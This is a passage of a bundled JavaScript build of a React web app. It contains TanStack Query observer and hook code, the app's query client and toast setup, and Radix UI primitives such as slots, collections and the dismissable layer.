  #notify(notifyOptions) {
    notifyManager.batch(() => {
      if (notifyOptions.listeners) {
        this.listeners.forEach((listener) => {
          listener(this.#currentResult);
        });
      }
      this.#client.getQueryCache().notify({
        query: this.#currentQuery,
        type: "observerResultsUpdated"
      });
    });
  }
};
function shouldLoadOnMount(query, options) {
  return resolveEnabled(options.enabled, query) !== false && query.state.data === void 0 && !(query.state.status === "error" && options.retryOnMount === false);
}
function shouldFetchOnMount(query, options) {
  return shouldLoadOnMount(query, options) || query.state.data !== void 0 && shouldFetchOn(query, options, options.refetchOnMount);
}
function shouldFetchOn(query, options, field) {
  if (resolveEnabled(options.enabled, query) !== false && resolveStaleTime(options.staleTime, query) !== "static") {
    const value = typeof field === "function" ? field(query) : field;
    return value === "always" || value !== false && isStale(query, options);
  }
  return false;
}
function shouldFetchOptionally(query, prevQuery, options, prevOptions) {
  return (query !== prevQuery || resolveEnabled(prevOptions.enabled, query) === false) && (!options.suspense || query.state.status !== "error") && isStale(query, options);
}
function isStale(query, options) {
  return resolveEnabled(options.enabled, query) !== false && query.isStaleByTime(resolveStaleTime(options.staleTime, query));
}
function shouldAssignObserverCurrentProperties(observer, optimisticResult) {
  if (!shallowEqualObjects(observer.getCurrentResult(), optimisticResult)) {
    return true;
  }
  return false;
}

// node_modules/@tanstack/query-core/build/modern/mutationObserver.js
var MutationObserver2 = class extends Subscribable {
  #client;
  #currentResult = void 0;
  #currentMutation;
  #mutateOptions;
  constructor(client, options) {
    super();
    this.#client = client;
    this.setOptions(options);
    this.bindMethods();
    this.#updateResult();
  }
  bindMethods() {
    this.mutate = this.mutate.bind(this);
    this.reset = this.reset.bind(this);
  }
  setOptions(options) {
    const prevOptions = this.options;
    this.options = this.#client.defaultMutationOptions(options);
    if (!shallowEqualObjects(this.options, prevOptions)) {
      this.#client.getMutationCache().notify({
        type: "observerOptionsUpdated",
        mutation: this.#currentMutation,
        observer: this
      });
    }
    if (prevOptions?.mutationKey && this.options.mutationKey && hashKey(prevOptions.mutationKey) !== hashKey(this.options.mutationKey)) {
      this.reset();
    } else if (this.#currentMutation?.state.status === "pending") {
      this.#currentMutation.setOptions(this.options);
    }
  }
  onUnsubscribe() {
    if (!this.hasListeners()) {
      this.#currentMutation?.removeObserver(this);
    }
  }
  onMutationUpdate(action) {
    this.#updateResult();
    this.#notify(action);
  }
  getCurrentResult() {
    return this.#currentResult;
  }
  reset() {
    this.#currentMutation?.removeObserver(this);
    this.#currentMutation = void 0;
    this.#updateResult();
    this.#notify();
  }
  mutate(variables, options) {
    this.#mutateOptions = options;
    this.#currentMutation?.removeObserver(this);
    this.#currentMutation = this.#client.getMutationCache().build(this.#client, this.options);
    this.#currentMutation.addObserver(this);
    return this.#currentMutation.execute(variables);
  }
  #updateResult() {
    const state = this.#currentMutation?.state ?? getDefaultState2();
    this.#currentResult = {
      ...state,
      isPending: state.status === "pending",
      isSuccess: state.status === "success",
      isError: state.status === "error",
      isIdle: state.status === "idle",
      mutate: this.mutate,
      reset: this.reset
    };
  }
  #notify(action) {
    notifyManager.batch(() => {
      if (this.#mutateOptions && this.hasListeners()) {
        const variables = this.#currentResult.variables;
        const context = this.#currentResult.context;
        if (action?.type === "success") {
          this.#mutateOptions.onSuccess?.(action.data, variables, context);
          this.#mutateOptions.onSettled?.(action.data, null, variables, context);
        } else if (action?.type === "error") {
          this.#mutateOptions.onError?.(action.error, variables, context);
          this.#mutateOptions.onSettled?.(
            void 0,
            action.error,
            variables,
            context
          );
        }
      }
      this.listeners.forEach((listener) => {
        listener(this.#currentResult);
      });
    });
  }
};

// node_modules/@tanstack/react-query/build/modern/QueryClientProvider.js
import * as React2 from "react";
import { jsx } from "react/jsx-runtime";
var QueryClientContext = React2.createContext(
  void 0
);
var useQueryClient = (queryClient2) => {
  const client = React2.useContext(QueryClientContext);
  if (queryClient2) {
    return queryClient2;
  }
  if (!client) {
    throw new Error("No QueryClient set, use QueryClientProvider to set one");
  }
  return client;
};
var QueryClientProvider = ({
  client,
  children
}) => {
  React2.useEffect(() => {
    client.mount();
    return () => {
      client.unmount();
    };
  }, [client]);
  return /* @__PURE__ */ jsx(QueryClientContext.Provider, { value: client, children });
};

// node_modules/@tanstack/react-query/build/modern/IsRestoringProvider.js
import * as React3 from "react";
var IsRestoringContext = React3.createContext(false);
var useIsRestoring = () => React3.useContext(IsRestoringContext);
var IsRestoringProvider = IsRestoringContext.Provider;

// node_modules/@tanstack/react-query/build/modern/QueryErrorResetBoundary.js
import * as React4 from "react";
import { jsx as jsx2 } from "react/jsx-runtime";
function createValue() {
  let isReset = false;
  return {
    clearReset: () => {
      isReset = false;
    },
    reset: () => {
      isReset = true;
    },
    isReset: () => {
      return isReset;
    }
  };
}
var QueryErrorResetBoundaryContext = React4.createContext(createValue());
var useQueryErrorResetBoundary = () => React4.useContext(QueryErrorResetBoundaryContext);

// node_modules/@tanstack/react-query/build/modern/errorBoundaryUtils.js
import * as React5 from "react";
var ensurePreventErrorBoundaryRetry = (options, errorResetBoundary) => {
  if (options.suspense || options.throwOnError || options.experimental_prefetchInRender) {
    if (!errorResetBoundary.isReset()) {
      options.retryOnMount = false;
    }
  }
};
var useClearResetErrorBoundary = (errorResetBoundary) => {
  React5.useEffect(() => {
    errorResetBoundary.clearReset();
  }, [errorResetBoundary]);
};
var getHasError = ({
  result,
  errorResetBoundary,
  throwOnError,
  query,
  suspense
}) => {
  return result.isError && !errorResetBoundary.isReset() && !result.isFetching && query && (suspense && result.data === void 0 || shouldThrowError(throwOnError, [result.error, query]));
};

// node_modules/@tanstack/react-query/build/modern/suspense.js
var ensureSuspenseTimers = (defaultedOptions) => {
  if (defaultedOptions.suspense) {
    const clamp3 = (value) => value === "static" ? value : Math.max(value ?? 1e3, 1e3);
    const originalStaleTime = defaultedOptions.staleTime;
    defaultedOptions.staleTime = typeof originalStaleTime === "function" ? (...args) => clamp3(originalStaleTime(...args)) : clamp3(originalStaleTime);
    if (typeof defaultedOptions.gcTime === "number") {
      defaultedOptions.gcTime = Math.max(defaultedOptions.gcTime, 1e3);
    }
  }
};
var willFetch = (result, isRestoring) => result.isLoading && result.isFetching && !isRestoring;
var shouldSuspend = (defaultedOptions, result) => defaultedOptions?.suspense && result.isPending;
var fetchOptimistic = (defaultedOptions, observer, errorResetBoundary) => observer.fetchOptimistic(defaultedOptions).catch(() => {
  errorResetBoundary.clearReset();
});

// node_modules/@tanstack/react-query/build/modern/useBaseQuery.js
import * as React6 from "react";
function useBaseQuery(options, Observer, queryClient2) {
  if (false) {
    if (typeof options !== "object" || Array.isArray(options)) {
      throw new Error(
        'Bad argument type. Starting with v5, only the "Object" form is allowed when calling query related functions. Please use the error stack to find the culprit call. More info here: https://tanstack.com/query/latest/docs/react/guides/migrating-to-v5#supports-a-single-signature-one-object'
      );
    }
  }
  const isRestoring = useIsRestoring();
  const errorResetBoundary = useQueryErrorResetBoundary();
  const client = useQueryClient(queryClient2);
  const defaultedOptions = client.defaultQueryOptions(options);
  client.getDefaultOptions().queries?._experimental_beforeQuery?.(
    defaultedOptions
  );
  if (false) {
    if (!defaultedOptions.queryFn) {
      console.error(
        `[${defaultedOptions.queryHash}]: No queryFn was passed as an option, and no default queryFn was found. The queryFn parameter is only optional when using a default queryFn. More info here: https://tanstack.com/query/latest/docs/framework/react/guides/default-query-function`
      );
    }
  }
  defaultedOptions._optimisticResults = isRestoring ? "isRestoring" : "optimistic";
  ensureSuspenseTimers(defaultedOptions);
  ensurePreventErrorBoundaryRetry(defaultedOptions, errorResetBoundary);
  useClearResetErrorBoundary(errorResetBoundary);
  const isNewCacheEntry = !client.getQueryCache().get(defaultedOptions.queryHash);
  const [observer] = React6.useState(
    () => new Observer(
      client,
      defaultedOptions
    )
  );
  const result = observer.getOptimisticResult(defaultedOptions);
  const shouldSubscribe = !isRestoring && options.subscribed !== false;
  React6.useSyncExternalStore(
    React6.useCallback(
      (onStoreChange) => {
        const unsubscribe = shouldSubscribe ? observer.subscribe(notifyManager.batchCalls(onStoreChange)) : noop;
        observer.updateResult();
        return unsubscribe;
      },
      [observer, shouldSubscribe]
    ),
    () => observer.getCurrentResult(),
    () => observer.getCurrentResult()
  );
  React6.useEffect(() => {
    observer.setOptions(defaultedOptions);
  }, [defaultedOptions, observer]);
  if (shouldSuspend(defaultedOptions, result)) {
    throw fetchOptimistic(defaultedOptions, observer, errorResetBoundary);
  }
  if (getHasError({
    result,
    errorResetBoundary,
    throwOnError: defaultedOptions.throwOnError,
    query: client.getQueryCache().get(defaultedOptions.queryHash),
    suspense: defaultedOptions.suspense
  })) {
    throw result.error;
  }
  ;
  client.getDefaultOptions().queries?._experimental_afterQuery?.(
    defaultedOptions,
    result
  );
  if (defaultedOptions.experimental_prefetchInRender && !isServer && willFetch(result, isRestoring)) {
    const promise = isNewCacheEntry ? (
      // Fetch immediately on render in order to ensure `.promise` is resolved even if the component is unmounted
      fetchOptimistic(defaultedOptions, observer, errorResetBoundary)
    ) : (
      // subscribe to the "cache promise" so that we can finalize the currentThenable once data comes in
      client.getQueryCache().get(defaultedOptions.queryHash)?.promise
    );
    promise?.catch(noop).finally(() => {
      observer.updateResult();
    });
  }
  return !defaultedOptions.notifyOnChangeProps ? observer.trackResult(result) : result;
}

// node_modules/@tanstack/react-query/build/modern/useQuery.js
function useQuery(options, queryClient2) {
  return useBaseQuery(options, QueryObserver, queryClient2);
}

// node_modules/@tanstack/react-query/build/modern/useMutation.js
import * as React7 from "react";
function useMutation(options, queryClient2) {
  const client = useQueryClient(queryClient2);
  const [observer] = React7.useState(
    () => new MutationObserver2(
      client,
      options
    )
  );
  React7.useEffect(() => {
    observer.setOptions(options);
  }, [observer, options]);
  const result = React7.useSyncExternalStore(
    React7.useCallback(
      (onStoreChange) => observer.subscribe(notifyManager.batchCalls(onStoreChange)),
      [observer]
    ),
    () => observer.getCurrentResult(),
    () => observer.getCurrentResult()
  );
  const mutate = React7.useCallback(
    (variables, mutateOptions) => {
      observer.mutate(variables, mutateOptions).catch(noop);
    },
    [observer]
  );
  if (result.error && shouldThrowError(observer.options.throwOnError, [result.error])) {
    throw result.error;
  }
  return { ...result, mutate, mutateAsync: result.mutate };
}

// client/src/lib/queryClient.ts
async function throwIfResNotOk(res) {
  if (!res.ok) {
    const text = await res.text() || res.statusText;
    throw new Error(`${res.status}: ${text}`);
  }
}
async function apiRequest(method, url, data) {
  const res = await fetch(url, {
    method,
    headers: data ? { "Content-Type": "application/json" } : {},
    body: data ? JSON.stringify(data) : void 0,
    credentials: "include"
  });
  await throwIfResNotOk(res);
  return res;
}
var getQueryFn = ({ on401: unauthorizedBehavior }) => async ({ queryKey }) => {
  const res = await fetch(queryKey[0], {
    credentials: "include"
  });
  if (unauthorizedBehavior === "returnNull" && res.status === 401) {
    return null;
  }
  await throwIfResNotOk(res);
  return await res.json();
};
var queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      queryFn: getQueryFn({ on401: "throw" }),
      refetchInterval: 5e3,
      // Refetch every 5 seconds
      refetchOnWindowFocus: true,
      staleTime: 1e3 * 10,
      // 10 seconds
      refetchIntervalInBackground: true,
      retry: 1
    },
    mutations: {
      retry: false,
      onSuccess: () => {
        queryClient.invalidateQueries();
        queryClient.refetchQueries();
      }
    }
  }
});

// client/src/hooks/use-toast.ts
import * as React8 from "react";
var TOAST_LIMIT = 1;
var TOAST_REMOVE_DELAY = 1e6;
var count = 0;
function genId() {
  count = (count + 1) % Number.MAX_SAFE_INTEGER;
  return count.toString();
}
var toastTimeouts = /* @__PURE__ */ new Map();
var addToRemoveQueue = (toastId) => {
  if (toastTimeouts.has(toastId)) {
    return;
  }
  const timeout = setTimeout(() => {
    toastTimeouts.delete(toastId);
    dispatch({
      type: "REMOVE_TOAST",
      toastId
    });
  }, TOAST_REMOVE_DELAY);
  toastTimeouts.set(toastId, timeout);
};
var reducer = (state, action) => {
  switch (action.type) {
    case "ADD_TOAST":
      return {
        ...state,
        toasts: [action.toast, ...state.toasts].slice(0, TOAST_LIMIT)
      };
    case "UPDATE_TOAST":
      return {
        ...state,
        toasts: state.toasts.map(
          (t) => t.id === action.toast.id ? { ...t, ...action.toast } : t
        )
      };
    case "DISMISS_TOAST": {
      const { toastId } = action;
      if (toastId) {
        addToRemoveQueue(toastId);
      } else {
        state.toasts.forEach((toast2) => {
          addToRemoveQueue(toast2.id);
        });
      }
      return {
        ...state,
        toasts: state.toasts.map(
          (t) => t.id === toastId || toastId === void 0 ? {
            ...t,
            open: false
          } : t
        )
      };
    }
    case "REMOVE_TOAST":
      if (action.toastId === void 0) {
        return {
          ...state,
          toasts: []
        };
      }
      return {
        ...state,
        toasts: state.toasts.filter((t) => t.id !== action.toastId)
      };
  }
};
var listeners = [];
var memoryState = { toasts: [] };
function dispatch(action) {
  memoryState = reducer(memoryState, action);
  listeners.forEach((listener) => {
    listener(memoryState);
  });
}
function toast({ ...props }) {
  const id2 = genId();
  const update = (props2) => dispatch({
    type: "UPDATE_TOAST",
    toast: { ...props2, id: id2 }
  });
  const dismiss = () => dispatch({ type: "DISMISS_TOAST", toastId: id2 });
  dispatch({
    type: "ADD_TOAST",
    toast: {
      ...props,
      id: id2,
      open: true,
      onOpenChange: (open) => {
        if (!open) dismiss();
      }
    }
  });
  return {
    id: id2,
    dismiss,
    update
  };
}
function useToast() {
  const [state, setState] = React8.useState(memoryState);
  React8.useEffect(() => {
    listeners.push(setState);
    return () => {
      const index2 = listeners.indexOf(setState);
      if (index2 > -1) {
        listeners.splice(index2, 1);
      }
    };
  }, [state]);
  return {
    ...state,
    toast,
    dismiss: (toastId) => dispatch({ type: "DISMISS_TOAST", toastId })
  };
}

// client/src/components/ui/toast.tsx
import * as React26 from "react";

// node_modules/@radix-ui/react-toast/dist/index.mjs
import * as React25 from "react";
import * as ReactDOM3 from "react-dom";

// node_modules/@radix-ui/primitive/dist/index.mjs
function composeEventHandlers(originalEventHandler, ourEventHandler, { checkForDefaultPrevented = true } = {}) {
  return function handleEvent(event) {
    originalEventHandler?.(event);
    if (checkForDefaultPrevented === false || !event.defaultPrevented) {
      return ourEventHandler?.(event);
    }
  };
}

// node_modules/@radix-ui/react-compose-refs/dist/index.mjs
import * as React9 from "react";
function setRef(ref, value) {
  if (typeof ref === "function") {
    return ref(value);
  } else if (ref !== null && ref !== void 0) {
    ref.current = value;
  }
}
function composeRefs(...refs) {
  return (node) => {
    let hasCleanup = false;
    const cleanups = refs.map((ref) => {
      const cleanup = setRef(ref, node);
      if (!hasCleanup && typeof cleanup == "function") {
        hasCleanup = true;
      }
      return cleanup;
    });
    if (hasCleanup) {
      return () => {
        for (let i = 0; i < cleanups.length; i++) {
          const cleanup = cleanups[i];
          if (typeof cleanup == "function") {
            cleanup();
          } else {
            setRef(refs[i], null);
          }
        }
      };
    }
  };
}
function useComposedRefs(...refs) {
  return React9.useCallback(composeRefs(...refs), refs);
}

// node_modules/@radix-ui/react-collection/dist/index.mjs
import React12 from "react";

// node_modules/@radix-ui/react-context/dist/index.mjs
import * as React10 from "react";
import { jsx as jsx3 } from "react/jsx-runtime";
function createContext22(rootComponentName, defaultContext) {
  const Context = React10.createContext(defaultContext);
  const Provider3 = (props) => {
    const { children, ...context } = props;
    const value = React10.useMemo(() => context, Object.values(context));
    return /* @__PURE__ */ jsx3(Context.Provider, { value, children });
  };
  Provider3.displayName = rootComponentName + "Provider";
  function useContext22(consumerName) {
    const context = React10.useContext(Context);
    if (context) return context;
    if (defaultContext !== void 0) return defaultContext;
    throw new Error(`\`${consumerName}\` must be used within \`${rootComponentName}\``);
  }
  return [Provider3, useContext22];
}
function createContextScope(scopeName, createContextScopeDeps = []) {
  let defaultContexts = [];
  function createContext32(rootComponentName, defaultContext) {
    const BaseContext = React10.createContext(defaultContext);
    const index2 = defaultContexts.length;
    defaultContexts = [...defaultContexts, defaultContext];
    const Provider3 = (props) => {
      const { scope, children, ...context } = props;
      const Context = scope?.[scopeName]?.[index2] || BaseContext;
      const value = React10.useMemo(() => context, Object.values(context));
      return /* @__PURE__ */ jsx3(Context.Provider, { value, children });
    };
    Provider3.displayName = rootComponentName + "Provider";
    function useContext22(consumerName, scope) {
      const Context = scope?.[scopeName]?.[index2] || BaseContext;
      const context = React10.useContext(Context);
      if (context) return context;
      if (defaultContext !== void 0) return defaultContext;
      throw new Error(`\`${consumerName}\` must be used within \`${rootComponentName}\``);
    }
    return [Provider3, useContext22];
  }
  const createScope = () => {
    const scopeContexts = defaultContexts.map((defaultContext) => {
      return React10.createContext(defaultContext);
    });
    return function useScope(scope) {
      const contexts = scope?.[scopeName] || scopeContexts;
      return React10.useMemo(
        () => ({ [`__scope${scopeName}`]: { ...scope, [scopeName]: contexts } }),
        [scope, contexts]
      );
    };
  };
  createScope.scopeName = scopeName;
  return [createContext32, composeContextScopes(createScope, ...createContextScopeDeps)];
}
function composeContextScopes(...scopes) {
  const baseScope = scopes[0];
  if (scopes.length === 1) return baseScope;
  const createScope = () => {
    const scopeHooks = scopes.map((createScope2) => ({
      useScope: createScope2(),
      scopeName: createScope2.scopeName
    }));
    return function useComposedScopes(overrideScopes) {
      const nextScopes = scopeHooks.reduce((nextScopes2, { useScope, scopeName }) => {
        const scopeProps = useScope(overrideScopes);
        const currentScope = scopeProps[`__scope${scopeName}`];
        return { ...nextScopes2, ...currentScope };
      }, {});
      return React10.useMemo(() => ({ [`__scope${baseScope.scopeName}`]: nextScopes }), [nextScopes]);
    };
  };
  createScope.scopeName = baseScope.scopeName;
  return createScope;
}

// node_modules/@radix-ui/react-slot/dist/index.mjs
import * as React11 from "react";
import { Fragment as Fragment22, jsx as jsx4 } from "react/jsx-runtime";
// @__NO_SIDE_EFFECTS__
function createSlot(ownerName) {
  const SlotClone = /* @__PURE__ */ createSlotClone(ownerName);
  const Slot22 = React11.forwardRef((props, forwardedRef) => {
    const { children, ...slotProps } = props;
    const childrenArray = React11.Children.toArray(children);
    const slottable = childrenArray.find(isSlottable);
    if (slottable) {
      const newElement = slottable.props.children;
      const newChildren = childrenArray.map((child) => {
        if (child === slottable) {
          if (React11.Children.count(newElement) > 1) return React11.Children.only(null);
          return React11.isValidElement(newElement) ? newElement.props.children : null;
        } else {
          return child;
        }
      });
      return /* @__PURE__ */ jsx4(SlotClone, { ...slotProps, ref: forwardedRef, children: React11.isValidElement(newElement) ? React11.cloneElement(newElement, void 0, newChildren) : null });
    }
    return /* @__PURE__ */ jsx4(SlotClone, { ...slotProps, ref: forwardedRef, children });
  });
  Slot22.displayName = `${ownerName}.Slot`;
  return Slot22;
}
var Slot = /* @__PURE__ */ createSlot("Slot");
// @__NO_SIDE_EFFECTS__
function createSlotClone(ownerName) {
  const SlotClone = React11.forwardRef((props, forwardedRef) => {
    const { children, ...slotProps } = props;
    if (React11.isValidElement(children)) {
      const childrenRef = getElementRef(children);
      const props2 = mergeProps(slotProps, children.props);
      if (children.type !== React11.Fragment) {
        props2.ref = forwardedRef ? composeRefs(forwardedRef, childrenRef) : childrenRef;
      }
      return React11.cloneElement(children, props2);
    }
    return React11.Children.count(children) > 1 ? React11.Children.only(null) : null;
  });
  SlotClone.displayName = `${ownerName}.SlotClone`;
  return SlotClone;
}
var SLOTTABLE_IDENTIFIER = Symbol("radix.slottable");
// @__NO_SIDE_EFFECTS__
function createSlottable(ownerName) {
  const Slottable2 = ({ children }) => {
    return /* @__PURE__ */ jsx4(Fragment22, { children });
  };
  Slottable2.displayName = `${ownerName}.Slottable`;
  Slottable2.__radixId = SLOTTABLE_IDENTIFIER;
  return Slottable2;
}
function isSlottable(child) {
  return React11.isValidElement(child) && typeof child.type === "function" && "__radixId" in child.type && child.type.__radixId === SLOTTABLE_IDENTIFIER;
}
function mergeProps(slotProps, childProps) {
  const overrideProps = { ...childProps };
  for (const propName in childProps) {
    const slotPropValue = slotProps[propName];
    const childPropValue = childProps[propName];
    const isHandler = /^on[A-Z]/.test(propName);
    if (isHandler) {
      if (slotPropValue && childPropValue) {
        overrideProps[propName] = (...args) => {
          const result = childPropValue(...args);
          slotPropValue(...args);
          return result;
        };
      } else if (slotPropValue) {
        overrideProps[propName] = slotPropValue;
      }
    } else if (propName === "style") {
      overrideProps[propName] = { ...slotPropValue, ...childPropValue };
    } else if (propName === "className") {
      overrideProps[propName] = [slotPropValue, childPropValue].filter(Boolean).join(" ");
    }
  }
  return { ...slotProps, ...overrideProps };
}
function getElementRef(element) {
  let getter = Object.getOwnPropertyDescriptor(element.props, "ref")?.get;
  let mayWarn = getter && "isReactWarning" in getter && getter.isReactWarning;
  if (mayWarn) {
    return element.ref;
  }
  getter = Object.getOwnPropertyDescriptor(element, "ref")?.get;
  mayWarn = getter && "isReactWarning" in getter && getter.isReactWarning;
  if (mayWarn) {
    return element.props.ref;
  }
  return element.props.ref || element.ref;
}

// node_modules/@radix-ui/react-collection/dist/index.mjs
import { jsx as jsx5 } from "react/jsx-runtime";
import React22 from "react";
import { jsx as jsx22 } from "react/jsx-runtime";
function createCollection(name) {
  const PROVIDER_NAME3 = name + "CollectionProvider";
  const [createCollectionContext, createCollectionScope4] = createContextScope(PROVIDER_NAME3);
  const [CollectionProviderImpl, useCollectionContext] = createCollectionContext(
    PROVIDER_NAME3,
    { collectionRef: { current: null }, itemMap: /* @__PURE__ */ new Map() }
  );
  const CollectionProvider = (props) => {
    const { scope, children } = props;
    const ref = React12.useRef(null);
    const itemMap = React12.useRef(/* @__PURE__ */ new Map()).current;
    return /* @__PURE__ */ jsx5(CollectionProviderImpl, { scope, itemMap, collectionRef: ref, children });
  };
  CollectionProvider.displayName = PROVIDER_NAME3;
  const COLLECTION_SLOT_NAME = name + "CollectionSlot";
  const CollectionSlotImpl = createSlot(COLLECTION_SLOT_NAME);
  const CollectionSlot = React12.forwardRef(
    (props, forwardedRef) => {
      const { scope, children } = props;
      const context = useCollectionContext(COLLECTION_SLOT_NAME, scope);
      const composedRefs = useComposedRefs(forwardedRef, context.collectionRef);
      return /* @__PURE__ */ jsx5(CollectionSlotImpl, { ref: composedRefs, children });
    }
  );
  CollectionSlot.displayName = COLLECTION_SLOT_NAME;
  const ITEM_SLOT_NAME = name + "CollectionItemSlot";
  const ITEM_DATA_ATTR = "data-radix-collection-item";
  const CollectionItemSlotImpl = createSlot(ITEM_SLOT_NAME);
  const CollectionItemSlot = React12.forwardRef(
    (props, forwardedRef) => {
      const { scope, children, ...itemData } = props;
      const ref = React12.useRef(null);
      const composedRefs = useComposedRefs(forwardedRef, ref);
      const context = useCollectionContext(ITEM_SLOT_NAME, scope);
      React12.useEffect(() => {
        context.itemMap.set(ref, { ref, ...itemData });
        return () => void context.itemMap.delete(ref);
      });
      return /* @__PURE__ */ jsx5(CollectionItemSlotImpl, { ...{ [ITEM_DATA_ATTR]: "" }, ref: composedRefs, children });
    }
  );
  CollectionItemSlot.displayName = ITEM_SLOT_NAME;
  function useCollection4(scope) {
    const context = useCollectionContext(name + "CollectionConsumer", scope);
    const getItems = React12.useCallback(() => {
      const collectionNode = context.collectionRef.current;
      if (!collectionNode) return [];
      const orderedNodes = Array.from(collectionNode.querySelectorAll(`[${ITEM_DATA_ATTR}]`));
      const items = Array.from(context.itemMap.values());
      const orderedItems = items.sort(
        (a, b) => orderedNodes.indexOf(a.ref.current) - orderedNodes.indexOf(b.ref.current)
      );
      return orderedItems;
    }, [context.collectionRef, context.itemMap]);
    return getItems;
  }
  return [
    { Provider: CollectionProvider, Slot: CollectionSlot, ItemSlot: CollectionItemSlot },
    useCollection4,
    createCollectionScope4
  ];
}

// node_modules/@radix-ui/react-dismissable-layer/dist/index.mjs
import * as React16 from "react";

// node_modules/@radix-ui/react-primitive/dist/index.mjs
import * as React13 from "react";
import * as ReactDOM from "react-dom";
import { jsx as jsx6 } from "react/jsx-runtime";
var NODES = [
  "a",
  "button",
  "div",
  "form",
  "h2",
  "h3",
  "img",
  "input",
  "label",
  "li",
  "nav",
  "ol",
  "p",
  "select",
  "span",
  "svg",
  "ul"
];
var Primitive = NODES.reduce((primitive, node) => {
  const Slot4 = createSlot(`Primitive.${node}`);
  const Node2 = React13.forwardRef((props, forwardedRef) => {
    const { asChild, ...primitiveProps } = props;
    const Comp = asChild ? Slot4 : node;
    if (typeof window !== "undefined") {
      window[Symbol.for("radix-ui")] = true;
    }
    return /* @__PURE__ */ jsx6(Comp, { ...primitiveProps, ref: forwardedRef });
  });
  Node2.displayName = `Primitive.${node}`;
  return { ...primitive, [node]: Node2 };
}, {});
function dispatchDiscreteCustomEvent(target, event) {
  if (target) ReactDOM.flushSync(() => target.dispatchEvent(event));
}

// node_modules/@radix-ui/react-use-callback-ref/dist/index.mjs
import * as React14 from "react";
function useCallbackRef(callback) {
  const callbackRef = React14.useRef(callback);
  React14.useEffect(() => {
    callbackRef.current = callback;
  });
  return React14.useMemo(() => (...args) => callbackRef.current?.(...args), []);
}

// node_modules/@radix-ui/react-use-escape-keydown/dist/index.mjs
import * as React15 from "react";
function useEscapeKeydown(onEscapeKeyDownProp, ownerDocument = globalThis?.document) {
  const onEscapeKeyDown = useCallbackRef(onEscapeKeyDownProp);
  React15.useEffect(() => {
    const handleKeyDown = (event) => {
      if (event.key === "Escape") {
        onEscapeKeyDown(event);
      }
    };
    ownerDocument.addEventListener("keydown", handleKeyDown, { capture: true });
    return () => ownerDocument.removeEventListener("keydown", handleKeyDown, { capture: true });
  }, [onEscapeKeyDown, ownerDocument]);
}

// node_modules/@radix-ui/react-dismissable-layer/dist/index.mjs
import { jsx as jsx7 } from "react/jsx-runtime";
var DISMISSABLE_LAYER_NAME = "DismissableLayer";
var CONTEXT_UPDATE = "dismissableLayer.update";
var POINTER_DOWN_OUTSIDE = "dismissableLayer.pointerDownOutside";
var FOCUS_OUTSIDE = "dismissableLayer.focusOutside";
var originalBodyPointerEvents;
var DismissableLayerContext = React16.createContext({
  layers: /* @__PURE__ */ new Set(),
  layersWithOutsidePointerEventsDisabled: /* @__PURE__ */ new Set(),
  branches: /* @__PURE__ */ new Set()
});
var DismissableLayer = React16.forwardRef(
  (props, forwardedRef) => {
    const {
      disableOutsidePointerEvents = false,
      onEscapeKeyDown,
      onPointerDownOutside,
      onFocusOutside,
      onInteractOutside,
      onDismiss,
      ...layerProps
    } = props;
    const context = React16.useContext(DismissableLayerContext);
    const [node, setNode] = React16.useState(null);
    const ownerDocument = node?.ownerDocument ?? globalThis?.document;
    const [, force] = React16.useState({});
    const composedRefs = useComposedRefs(forwardedRef, (node2) => setNode(node2));
    const layers = Array.from(context.layers);
    const [highestLayerWithOutsidePointerEventsDisabled] = [...context.layersWithOutsidePointerEventsDisabled].slice(-1);
    const highestLayerWithOutsidePointerEventsDisabledIndex = layers.indexOf(highestLayerWithOutsidePointerEventsDisabled);
    const index2 = node ? layers.indexOf(node) : -1;
    const isBodyPointerEventsDisabled = context.layersWithOutsidePointerEventsDisabled.size > 0;
    const isPointerEventsEnabled = index2 >= highestLayerWithOutsidePointerEventsDisabledIndex;
    const pointerDownOutside = usePointerDownOutside((event) => {
      const target = event.target;
      const isPointerDownOnBranch = [...context.branches].some((branch) => branch.contains(target));
      if (!isPointerEventsEnabled || isPointerDownOnBranch) return;
      onPointerDownOutside?.(event);
      onInteractOutside?.(event);
      if (!event.defaultPrevented) onDismiss?.();
    }, ownerDocument);
    const focusOutside = useFocusOutside((event) => {
      const target = event.target;
      const isFocusInBranch = [...context.branches].some((branch) => branch.contains(target));
      if (isFocusInBranch) return;
      onFocusOutside?.(event);
      onInteractOutside?.(event);
      if (!event.defaultPrevented) onDismiss?.();
    }, ownerDocument);
    useEscapeKeydown((event) => {
      const isHighestLayer = index2 === context.layers.size - 1;
      if (!isHighestLayer) return;
      onEscapeKeyDown?.(event);
      if (!event.defaultPrevented && onDismiss) {
        event.preventDefault();
        onDismiss();
      }
    }, ownerDocument);
    React16.useEffect(() => {
      if (!node) return;
      if (disableOutsidePointerEvents) {
        if (context.layersWithOutsidePointerEventsDisabled.size === 0) {
          originalBodyPointerEvents = ownerDocument.body.style.pointerEvents;
          ownerDocument.body.style.pointerEvents = "none";
        }
        context.layersWithOutsidePointerEventsDisabled.add(node);
      }
      context.layers.add(node);
      dispatchUpdate();
      return () => {
        if (disableOutsidePointerEvents && context.layersWithOutsidePointerEventsDisabled.size === 1) {
          ownerDocument.body.style.pointerEvents = originalBodyPointerEvents;
        }
      };
    }, [node, ownerDocument, disableOutsidePointerEvents, context]);
    React16.useEffect(() => {
      return () => {
        if (!node) return;
        context.layers.delete(node);
        context.layersWithOutsidePointerEventsDisabled.delete(node);
        dispatchUpdate();
      };
    }, [node, context]);
    React16.useEffect(() => {
      const handleUpdate = () => force({});
      document.addEventListener(CONTEXT_UPDATE, handleUpdate);
      return () => document.removeEventListener(CONTEXT_UPDATE, handleUpdate);
    }, []);
    return /* @__PURE__ */ jsx7(
      Primitive.div,
      {
        ...layerProps,
        ref: composedRefs,
        style: {
          pointerEvents: isBodyPointerEventsDisabled ? isPointerEventsEnabled ? "auto" : "none" : void 0,
          ...props.style
        },
        onFocusCapture: composeEventHandlers(props.onFocusCapture, focusOutside.onFocusCapture),
        onBlurCapture: composeEventHandlers(props.onBlurCapture, focusOutside.onBlurCapture),
        onPointerDownCapture: composeEventHandlers(
          props.onPointerDownCapture,
          pointerDownOutside.onPointerDownCapture
        )
      }
    );
  }
);
DismissableLayer.displayName = DISMISSABLE_LAYER_NAME;
var BRANCH_NAME = "DismissableLayerBranch";
var DismissableLayerBranch = React16.forwardRef((props, forwardedRef) => {
  const context = React16.useContext(DismissableLayerContext);
  const ref = React16.useRef(null);
  const composedRefs = useComposedRefs(forwardedRef, ref);
  React16.useEffect(() => {
    const node = ref.current;
    if (node) {
      context.branches.add(node);
      return () => {
        context.branches.delete(node);
      };
    }
  }, [context.branches]);
